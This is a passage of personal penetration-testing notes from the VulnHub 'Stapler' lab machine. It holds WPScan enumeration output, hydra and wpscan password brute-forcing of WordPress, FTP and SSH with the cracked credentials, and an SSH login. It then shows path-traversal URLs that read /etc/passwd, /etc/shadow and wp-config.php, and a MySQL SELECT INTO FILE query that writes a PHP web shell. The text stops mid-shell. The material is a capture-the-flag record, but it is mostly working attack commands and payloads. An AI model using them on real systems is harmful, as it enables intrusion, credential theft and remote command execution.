WordPress 3.7-4.9.4 - Use Safe Redirect for Login | Fixed in: 4.2.20 | References: | - https://wpvulndb.com/vulnerabilities/9054 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e | | \u001b[31m[!]\u001b[0m Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag | Fixed in: 4.2.20 | References: | - https://wpvulndb.com/vulnerabilities/9055 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102 | - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 4.9.6 - Authenticated Arbitrary File Deletion | Fixed in: 4.2.21 | References: | - https://wpvulndb.com/vulnerabilities/9100 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895 | - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/ | - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/ | - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd | - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/ | - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.0 - Authenticated File Delete | Fixed in: 4.2.22 | References: | - https://wpvulndb.com/vulnerabilities/9169 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.0 - Authenticated Post Type Bypass | Fixed in: 4.2.22 | References: | - https://wpvulndb.com/vulnerabilities/9170 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.0 - PHP Object Injection via Meta Data | Fixed in: 4.2.22 | References: | - https://wpvulndb.com/vulnerabilities/9171 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.0 - Authenticated Cross-Site Scripting (XSS) | Fixed in: 4.2.22 | References: | - https://wpvulndb.com/vulnerabilities/9172 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins | Fixed in: 4.2.22 | References: | - https://wpvulndb.com/vulnerabilities/9173 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.0 - User Activation Screen Search Engine Indexing | Fixed in: 4.2.22 | References: | - https://wpvulndb.com/vulnerabilities/9174 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.0 - File Upload to XSS on Apache Web Servers | Fixed in: 4.2.22 | References: | - https://wpvulndb.com/vulnerabilities/9175 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149 | - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/ | - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a | | \u001b[31m[!]\u001b[0m Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution | Fixed in: 5.0.1 | References: | - https://wpvulndb.com/vulnerabilities/9222 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943 | - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/ | - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce | | \u001b[31m[!]\u001b[0m Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS) | Fixed in: 4.2.23 | References: | - https://wpvulndb.com/vulnerabilities/9230 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787 | - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b | - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/ | - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation | Fixed in: 4.2.24 | References: | - https://wpvulndb.com/vulnerabilities/9867 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222 | - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/ | - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68 | - https://hackerone.com/reports/339483 | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.2.3 - Stored XSS in Customizer | Fixed in: 4.2.25 | References: | - https://wpvulndb.com/vulnerabilities/9908 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674 | - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/ | - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.2.3 - Unauthenticated View Private/Draft Posts | Fixed in: 4.2.25 | References: | - https://wpvulndb.com/vulnerabilities/9909 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671 | - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/ | - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html | - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308 | - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.2.3 - Stored XSS in Style Tags | Fixed in: 4.2.25 | References: | - https://wpvulndb.com/vulnerabilities/9910 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672 | - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/ | - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.2.3 - JSON Request Cache Poisoning | Fixed in: 4.2.25 | References: | - https://wpvulndb.com/vulnerabilities/9911 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673 | - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/ | - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de | - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation | Fixed in: 4.2.25 | References: | - https://wpvulndb.com/vulnerabilities/9912 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670 | - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/ | - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2 | - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.2.3 - Admin Referrer Validation | Fixed in: 4.2.25 | References: | - https://wpvulndb.com/vulnerabilities/9913 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675 | - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/ | - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0 | - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.3 - Improper Access Controls | Fixed in: 4.2.26 | References: | - https://wpvulndb.com/vulnerabilities/9973 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043 | - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.3 - Stored XSS via Crafted Links | Fixed in: 4.2.26 | References: | - https://wpvulndb.com/vulnerabilities/9975 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042 | - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/ | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.3 - Stored XSS via Block Editor Content | Fixed in: 4.2.26 | References: | - https://wpvulndb.com/vulnerabilities/9976 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780 | - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/ | - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v | | \u001b[31m[!]\u001b[0m Title: WordPress \u0026lt;= 5.3 - wp_kses_bad_protocol() Colon Bypass | Fixed in: 4.2.26 | References: | - https://wpvulndb.com/vulnerabilities/10004 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041 | - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/ | - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53 \u001b[34m[i]\u001b[0m The main theme could not be detected. \u001b[34m[i]\u001b[0m Plugin(s) Identified: \u001b[32m[+]\u001b[0m advanced-video-embed-embed-videos-or-playlists | Location: https://192.168.56.101:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/ | Latest Version: 1.0 (up to date) | Last Updated: 2015-10-14T13:52:00.000Z | Readme: https://192.168.56.101:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt | \u001b[31m[!]\u001b[0m Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | | Version: 1.0 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://192.168.56.101:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt \u001b[32m[+]\u001b[0m akismet | Location: https://192.168.56.101:12380/blogblog/wp-content/plugins/akismet/ | Latest Version: 4.1.3 | Last Updated: 2019-11-13T20:46:00.000Z | | Found By: Known Locations (Aggressive Detection) | | \u001b[31m[!]\u001b[0m 1 vulnerability identified: | | \u001b[31m[!]\u001b[0m Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS) | Fixed in: 3.1.5 | References: | - https://wpvulndb.com/vulnerabilities/8215 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357 | - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/ | - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html | | The version could not be determined. \u001b[32m[+]\u001b[0m shortcode-ui | Location: https://192.168.56.101:12380/blogblog/wp-content/plugins/shortcode-ui/ | Last Updated: 2019-01-16T22:56:00.000Z | Readme: https://192.168.56.101:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt | \u001b[33m[!]\u001b[0m The version is out of date, the latest version is 0.7.4 | \u001b[31m[!]\u001b[0m Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | | Version: 0.6.2 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://192.168.56.101:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt \u001b[32m[+]\u001b[0m two-factor | Location: https://192.168.56.101:12380/blogblog/wp-content/plugins/two-factor/ | Latest Version: 0.4.8 | Last Updated: 2019-12-26T20:14:00.000Z | Readme: https://192.168.56.101:12380/blogblog/wp-content/plugins/two-factor/readme.txt | \u001b[31m[!]\u001b[0m Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | | The version could not be determined. \u001b[34m[i]\u001b[0m Theme(s) Identified: \u001b[32m[+]\u001b[0m bhost | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/bhost/ | Latest Version: 1.4.4 | Last Updated: 2019-12-08T00:00:00.000Z | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/bhost/readme.txt | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/bhost/style.css | Style Name: BHost | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ... | Author: Masum Billah | Author URI: http://getmasum.net/ | | Found By: Known Locations (Aggressive Detection) | | The version could not be determined. \u001b[32m[+]\u001b[0m creative-blog | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/creative-blog/ | Latest Version: 1.1.2 | Last Updated: 2019-03-22T00:00:00.000Z | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/creative-blog/readme.txt | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/creative-blog/style.css | Style Name: Creative Blog | Style URI: http://napitwptech.com/themes/creative-blog/ | Description: Creative Blog is an extremely creative WordPress theme to create your own personal blog site very ea... | Author: Bishal Napit | Author URI: http://napitwptech.com/themes/ | | Found By: Known Locations (Aggressive Detection) | | The version could not be determined. \u001b[32m[+]\u001b[0m sydney | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/sydney/ | Latest Version: 1.57 | Last Updated: 2019-12-17T00:00:00.000Z | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/sydney/readme.txt | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/sydney/style.css | Style Name: Sydney | Style URI: http://athemes.com/theme/sydney | Description: Sydney is a powerful business theme that provides a fast way for companies or freelancers to create ... | Author: aThemes | Author URI: http://athemes.com | | Found By: Known Locations (Aggressive Detection) | | The version could not be determined. \u001b[32m[+]\u001b[0m trope | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/trope/ | Latest Version: 1.2 | Last Updated: 2018-06-12T00:00:00.000Z | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/trope/readme.txt | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/trope/style.css | Style Name: Trope | Style URI: http://wpdean.com/trope-wordpress-theme/ | Description: Trope is a free WordPress theme that comes with clean, modern, minimal and fully responsive design w... | Author: WPDean | Author URI: http://wpdean.com/ | | Found By: Known Locations (Aggressive Detection) | | The version could not be determined. \u001b[32m[+]\u001b[0m twentyfifteen | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfifteen/ | Latest Version: 2.5 | Last Updated: 2019-05-07T00:00:00.000Z | Readme: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfifteen/readme.txt | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfifteen/style.css | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | | \u001b[31m[!]\u001b[0m 1 vulnerability identified: | | \u001b[31m[!]\u001b[0m Title: Twenty Fifteen Theme \u0026lt;= 1.1 - DOM Cross-Site Scripting (XSS) | Fixed in: 1.2 | References: | - https://wpvulndb.com/vulnerabilities/7965 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3429 | - https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html | - https://packetstormsecurity.com/files/131802/ | - https://seclists.org/fulldisclosure/2015/May/41 | | The version could not be determined. \u001b[32m[+]\u001b[0m twentyfourteen | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfourteen/ | Latest Version: 2.7 | Last Updated: 2019-05-07T00:00:00.000Z | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/twentyfourteen/style.css | Style Name: Twenty Fourteen | Style URI: https://wordpress.org/themes/twentyfourteen/ | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | | The version could not be determined. \u001b[32m[+]\u001b[0m twentythirteen | Location: https://192.168.56.101:12380/blogblog/wp-content/themes/twentythirteen/ | Latest Version: 2.9 | Last Updated: 2019-05-07T00:00:00.000Z | Style URL: https://192.168.56.101:12380/blogblog/wp-content/themes/twentythirteen/style.css | Style Name: Twenty Thirteen | Style URI: https://wordpress.org/themes/twentythirteen/ | Description: The 2013 theme for WordPress takes us back to the blog, featuring a full range of post formats, each... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | | The version could not be determined. \u001b[34m[i]\u001b[0m No Timthumbs Found. \u001b[34m[i]\u001b[0m No Config Backups Found. \u001b[34m[i]\u001b[0m No DB Exports Found. \u001b[34m[i]\u001b[0m No Medias Found. \u001b[34m[i]\u001b[0m User(s) Identified: \u001b[32m[+]\u001b[0m peter | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m john | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m elly | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m barry | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m heather | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m garry | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m harry | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m scott | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m kathy | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m tim | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) \u001b[32m[+]\u001b[0m WPVulnDB API OK | Plan: free | Requests Done (during the scan): 12 | Requests Remaining: 34 \u001b[32m[+]\u001b[0m Finished: Mon Jan 6 15:30:35 2020 \u001b[32m[+]\u001b[0m Requests Done: 107636 \u001b[32m[+]\u001b[0m Cached Requests: 21 \u001b[32m[+]\u001b[0m Data Sent: 29.104 MB \u001b[32m[+]\u001b[0m Data Received: 15.057 MB \u001b[32m[+]\u001b[0m Memory used: 373.49 MB \u001b[32m[+]\u001b[0m Elapsed time: 00:06:06  Brute Forcing Wordpress root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# wpscan --url https://192.168.56.101:12380/blogblog/ -U users_wp.txt -P /usr/share/wordlists/rockyou.txt --disable-tls-checks [+] Performing password attack on Xmlrpc Multicall against 1 user/s [SUCCESS] - john / incorrect All Found Progress Time: 00:23:12 \u0026lt;= root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# wpscan --url https://192.168.56.101:12380/blogblog/ -U users_wp.txt -P /usr/share/wordlists/rockyou.txt --disable-tls-checks [+] Performing password attack on Xmlrpc Multicall against 10 user/s [SUCCESS] - harry / monkey [SUCCESS] - garry / football [SUCCESS] - harry / monkey [SUCCESS] - scott / cookie [SUCCESS] - kathy / coolgirl KILLED  ftp root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# hydra -L users_ftp.txt -e nsr ftp://192.168.56.101 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 20:54:58 [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task [DATA] attacking ftp://192.168.56.101:21/ [21][ftp] host: 192.168.56.101 login: elly password: ylle [STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 20:55:02 root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# hydra -t 64 -L users_ftp.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.56.101 ftp Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 18:22:52 [DATA] max 64 tasks per 1 server, overall 64 tasks, 3027 login tries (l:3/p:1009), ~48 tries per task [DATA] attacking ftp://192.168.56.101:21/ [STATUS] 1458.00 tries/min, 1458 tries in 00:01h, 1698 to do in 00:02h, 64 active 1 of 1 target completed, 0 valid passwords found [WARNING] Writing restore file because 13 final worker threads did not complete until end. [ERROR] 13 targets did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 18:24:37  ssh root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# hydra -L users_unix.txt -e nsr 192.168.56.101 ssh -t 4 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 20:58:38 [DATA] max 4 tasks per 1 server, overall 4 tasks, 90 login tries (l:30/p:3), ~23 tries per task [DATA] attacking ssh://192.168.56.101:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://peter@192.168.56.101:22 [INFO] Successful, password authentication is supported by ssh://192.168.56.101:22 [22][ssh] host: 192.168.56.101 login: SHayslett password: SHayslett [STATUS] 52.00 tries/min, 52 tries in 00:01h, 38 to do in 00:01h, 4 active [STATUS] attack finished for 192.168.56.101 (waiting for children to complete tests) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 21:00:25 root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# hydra -t 64 -L users_unix.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.56.101 ssh Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-06 18:31:43 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 64 tasks per 1 server, overall 64 tasks, 30270 login tries (l:30/p:1009), ~473 tries per task [DATA] attacking ssh://192.168.56.101:22/ [STATUS] 370.00 tries/min, 370 tries in 00:01h, 30029 to do in 01:22h, 64 active [STATUS] 918.33 tries/min, 2755 tries in 00:03h, 27644 to do in 00:31h, 64 active [STATUS] 1169.43 tries/min, 8186 tries in 00:07h, 22213 to do in 00:19h, 64 active [STATUS] 1232.17 tries/min, 14786 tries in 00:12h, 15613 to do in 00:13h, 64 active [STATUS] 1272.29 tries/min, 21629 tries in 00:17h, 8770 to do in 00:07h, 64 active [STATUS] 1295.50 tries/min, 28501 tries in 00:22h, 1898 to do in 00:02h, 64 active [STATUS] 1296.87 tries/min, 29828 tries in 00:23h, 571 to do in 00:01h, 64 active 1 of 1 target completed, 0 valid passwords found [WARNING] Writing restore file because 39 final worker threads did not complete until end. [ERROR] 39 targets did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-06 18:55:23  Exploit ssh - SHayslett@red lower priv shell\nroot@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# ssh SHayslett@192.168.56.101 The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established. ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts. ----------------------------------------------------------------- ~ Barry, don't forget to put a message here ~ ----------------------------------------------------------------- SHayslett@192.168.56.101's password: Welcome back!  FTP - elly grabbed some config files and passwd. see loot/ftp.\nAdvanced Video 1.0 https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost\u0026amp;title=random\u0026amp;short=1\u0026amp;term=1\u0026amp;thumb=../../../../../../../../etc/passwd https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost\u0026amp;title=random\u0026amp;short=1\u0026amp;term=1\u0026amp;thumb=../../../../../../../../etc/shadow https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost\u0026amp;title=random\u0026amp;short=1\u0026amp;term=1\u0026amp;thumb=../wp-config.php https://192.168.56.101:12380/blogblog/wp-content/uploads/ Index of /blogblog/wp-content/uploads [ICO]\tName\tLast modified\tSize\tDescription [PARENTDIR]\tParent Directory\t- [IMG]\t12316364.jpeg\t2020-01-06 19:31 3.0K [IMG]\t419913483.jpeg\t2020-01-06 19:25 2.8K [IMG]\t737478762.jpeg\t2020-01-06 19:27 0 Apache/2.4.18 (Ubuntu) Server at 192.168.56.101 Port 12380  wp-config define('DB_NAME', 'wordpress'); /** MySQL database username */ define('DB_USER', 'root'); /** MySQL database password */ define('DB_PASSWORD', 'plbkac');  phpmyadmin Exported all usernames/hashes. See loot/sql folder.\nroot@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler/sql/wordspress# hash-identifier 8cb2237d0679ca88db6464eac60da96345513964 ############################################################################################################# # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /'__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ############################################################################################################# -------------------------------------------------- Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass))  SELECT INTO FILE\nselect '\u0026lt;!-- By justin-p (https://github.com/justin-p) based of https://github.com/artyuum/Simple-PHP-Web-Shell/ --\u0026gt; \u0026lt;?php if (empty($_POST[''cmd''])) {$cmd = \u0026quot;\u0026quot;;} elseif (!empty($_POST[''cmd''])) {$cmd = shell_exec($_POST[''cmd'']);} ?\u0026gt; \u0026lt;form method=\u0026quot;POST\u0026quot;\u0026gt;\u0026lt;input type=\u0026quot;text\u0026quot; style=\u0026quot;width:100%;height:25px;\u0026quot; name=\u0026quot;cmd\u0026quot; id=\u0026quot;cmd\u0026quot; value=\u0026quot;\u0026lt;?php if (!empty($_POST[''cmd''])) {htmlspecialchars($_POST[''cmd''], ENT_QUOTES, ''UTF-8'');} ?\u0026gt;\u0026quot; required\u0026gt;\u0026lt;button type=\u0026quot;submit\u0026quot; class=\u0026quot;btn btn-primary\u0026quot;\u0026gt;Execute\u0026lt;/button\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;?php if (!$cmd \u0026amp;\u0026amp; $_SERVER[''REQUEST_METHOD''] != ''POST''): ?\u0026gt;\u0026lt;small\u0026gt;Enter command.\u0026lt;/small\u0026gt; \u0026lt;?php elseif ($cmd): ?\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;?= htmlspecialchars($cmd, ENT_QUOTES, ''UTF-8'') ?\u0026gt;\u0026lt;/pre\u0026gt; \u0026lt;?php elseif (!$cmd \u0026amp;\u0026amp; $_SERVER[''REQUEST_METHOD''] == ''POST''): ?\u0026gt;\u0026lt;small\u0026gt;No results.\u0026lt;/small\u0026gt;\u0026lt;?php 